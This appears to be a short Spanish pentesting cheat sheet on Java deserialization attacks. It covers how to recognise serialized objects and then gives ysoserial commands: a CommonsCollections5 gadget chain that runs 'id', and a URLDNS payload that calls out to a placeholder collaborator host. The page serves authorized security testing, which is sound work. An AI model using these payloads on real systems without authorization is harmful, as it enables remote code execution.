# Deserialización — Java

Ver índice: [deserializacion.md](deserializacion.md). **Solo sobre objetivos autorizados.**

## Identificar

- Blob base64 que empieza por `rO0` (bytes `AC ED 00 05`).
- Endpoints que reciben objetos serializados (RMI, algunas APIs, cookies, campos ocultos).

## Explotación

La vía clásica: **gadget chains** en librerías del classpath (Commons-Collections, Spring, etc.).

```
ysoserial CommonsCollections5 'id' | base64      # genera el payload
# enviar el objeto serializado al endpoint vulnerable
```

- Elige la gadget chain según las librerías presentes (a veces prueba por prueba).
- Para blind, usa una chain que haga una petición OOB (URLDNS) para confirmar.

```
ysoserial URLDNS 'http://TU-COLLABORATOR' | base64    # confirmación OOB sin RCE
```

## Notas

- `URLDNS` es ideal para **confirmar** deserialización sin ejecutar comandos.
- Ajusta a la versión de las librerías; si fallan las conocidas, enumera el classpath.
